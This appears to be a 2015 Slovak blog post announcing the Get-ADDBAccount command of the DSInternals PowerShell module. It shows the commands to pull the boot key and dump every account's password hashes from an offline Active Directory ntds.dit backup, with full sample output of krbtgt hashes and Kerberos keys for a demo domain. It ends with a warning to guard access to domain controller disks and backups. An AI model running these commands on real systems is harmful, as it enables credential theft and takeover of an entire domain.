---
ref: dumping-ntds-dit-files
title: 'Vykrádanie hesiel zo zálohy Active&nbsp;Directory'
date: 2015-08-15T21:29:37+00:00
layout: post
lang: sk
permalink: /sk/vykradanie-hesiel-zo-zalohy-active-directory/
image: /assets/images/dbaccount.png
tags:
    - 'Active Directory'
    - PowerShell
    - Security
---

Nedávno som písal o&nbsp;príkaze [Get-ADReplAccount](/sk/vykradanie-hesiel-z-active-directory-na-dialku/), pomocou ktorého je&nbsp;možné vzdialene vytiahnuť heslá a&nbsp;iné citlivé informácie z&nbsp;doménového kontroléru. Tieto dáta sú na&nbsp;každom doménovom kontroléri uložené v&nbsp;súbore **ndts.dit** a&nbsp;odtiaľ sa&nbsp;dajú získať aj&nbsp;napriamo. Dokáže to&nbsp;napríklad nástroj [NTDSXtact](https://github.com/csababarta/ntdsxtract), ale&nbsp;ten je&nbsp;určený pre&nbsp;Linux, nemá moc jednoduché ovládanie a&nbsp;na&nbsp;väčších databázach je&nbsp;dosť pomalý. Preto som do&nbsp;svojho [PowerShell modulu DSInternals](/sk/projekty/) pridal príkaz **Get-ADDBAccount**, ktorého použitie je&nbsp;hračka:

```powershell
# Z registrov najprv získame tzv. Boot Key, ktorým sú heslá zašifrované:
$key = Get-BootKey -SystemHivePath 'C:\IFM\registry\SYSTEM'

# Načítame databázu a dešifrujeme heslá všetkých používateľov:
Get-ADDBAccount -All -DBPath 'C:\IFM\Active Directory\ntds.dit' -BootKey $key 

# Môžeme vytiahnuť aj heslo konkrétneho účtu, na základe distinguishedName, objectGuid, objectSid či sAMAccountName:
Get-ADDBAccount -DistinguishedName 'CN=krbtgt,CN=Users,DC=Adatum,DC=com' -DBPath 'C:\IFM\Active Directory\ntds.dit' -BootKey $key 
```

<!--more-->

Výstup vyzerá úplne rovnako ako v&nbsp;prípade príkazu [Get-ADReplAccount](/sk/vykradanie-hesiel-z-active-directory-na-dialku/):

```
DistinguishedName: CN=krbtgt,CN=Users,DC=Adatum,DC=com
Sid: S-1-5-21-3180365339-800773672-3767752645-502
Guid: f58947a0-094b-4ae0-9c6a-a435c7d8eddb
SamAccountName: krbtgt
SamAccountType: User
UserPrincipalName:
PrimaryGroupId: 513
SidHistory:
Enabled: False
Deleted: False
LastLogon:
DisplayName:
GivenName:
Surname:
Description: Key Distribution Center Service Account
NTHash: 9b17bcfc3800df21baa6b8a4aeedb4fd
LMHash:
NTHashHistory:
  Hash 01: 9b17bcfc3800df21baa6b8a4aeedb4fd
  Hash 02: c9467e5fae14820500862d85c53747c1
LMHashHistory:
  Hash 01: 1a1d073fde1fca32c24f268fce835de2
  Hash 02: cc8019ecf6fdbcbe06849a9980804e8d
SupplementalCredentials:
  ClearText:
  Kerberos:
    Credentials:
      DES_CBC_MD5
        Key: cddf7308d6cd5d2a
    OldCredentials:
      DES_CBC_MD5
        Key: cddf7308d6cd5d2a
    Salt: ADATUM.COMkrbtgt
    Flags: 0
  KerberosNew:
    Credentials:
      AES256_CTS_HMAC_SHA1_96
        Key: 69b11bfec0eec2b278702bc7d9fbfda23e3789128b92c59955e69932a457533b
        Iterations: 4096
      AES128_CTS_HMAC_SHA1_96
        Key: bcfcc7a65379d7914c2c341a74ca0e0e
        Iterations: 4096
      DES_CBC_MD5
        Key: cddf7308d6cd5d2a
        Iterations: 4096
    OldCredentials:
      AES256_CTS_HMAC_SHA1_96
        Key: 809b0f1697dffe39bb87b2e3d79564dc8ef91b91bad2fc51abc444e42c7e88d9
        Iterations: 4096
      AES128_CTS_HMAC_SHA1_96
        Key: c30fb9e17cd7503f980592a6864c8daa
        Iterations: 4096
      DES_CBC_MD5
        Key: cddf7308d6cd5d2a
        Iterations: 4096
    OlderCredentials:
    ServiceCredentials:
    Salt: ADATUM.COMkrbtgt
    DefaultIterationCount: 4096
    Flags: 0
  WDigest:
    Hash 01: eee4408f94b35bb5dc7077747d9762a3
    Hash 02: 00be705a97c4a1ded7f7fc912ef70aec
    Hash 03: 7b0b14e8f5cfa2de25d04d393c649bb7
    Hash 04: eee4408f94b35bb5dc7077747d9762a3
    Hash 05: 00be705a97c4a1ded7f7fc912ef70aec
    Hash 06: cf102efea5397a51edc9202b922682e5
    Hash 07: eee4408f94b35bb5dc7077747d9762a3
    Hash 08: 5737a1de1f94d3f6e0dbbe4e3f173036
    Hash 09: 9314bbcd0f0f8ab2d3879287e739f621
    Hash 10: 973ff6673784ce0faa956d10952b0be0
    Hash 11: b04c5754a36b8edaac0dfd3c8b741d1a
    Hash 12: 9314bbcd0f0f8ab2d3879287e739f621
    Hash 13: decbd6b05ac2363ef7c772b42339fdab
    Hash 14: b04c5754a36b8edaac0dfd3c8b741d1a
    Hash 15: 71e248eae58d2f1f4b40baf412fde251
    Hash 16: 8f03fa2cf1cdbb300d0e0992fb5265e1
    Hash 17: 5032b686f9b0187115c5b56a4de89d1e
    Hash 18: eb804e4333521ee5e74241db4ecd7e5e
    Hash 19: c86f4816e80f0a590cb03f0b9aa8c04c
    Hash 20: 0e03a76194c6385754a1814384c99798
    Hash 21: db13be8eb45adad0984e5a68ea2dfe23
    Hash 22: db13be8eb45adad0984e5a68ea2dfe23
    Hash 23: 5b6bba9bae24a347108ad7267e1ac287
    Hash 24: e72cad8b0fc837d3e8de4ddc725eb81f
    Hash 25: c19dd7b576c43eec07ba475bd444f579
    Hash 26: 021c07151ece2de494402cf11f62a036
    Hash 27: d657b31bfcacb37443630759cc3a19bf
    Hash 28: 5d49708350e04b16ddc980a0c33c409b
    Hash 29: efe601100b7b4007fe3fa778499d5dda
```

Získané hashe hesiel sa&nbsp;dajú pomerne jednoducho využiť k&nbsp;ovládnutiu celého Active Directory forestu. Preto si&nbsp;dajte dobrý pozor na&nbsp;to,&nbsp;kto všetko má fyzický prístup k&nbsp;pevným diskom doménových kontrolérov, ich zálohám a&nbsp;v&nbsp;neposledom rade k&nbsp;VHD/VHDX/VMDK obrazom.
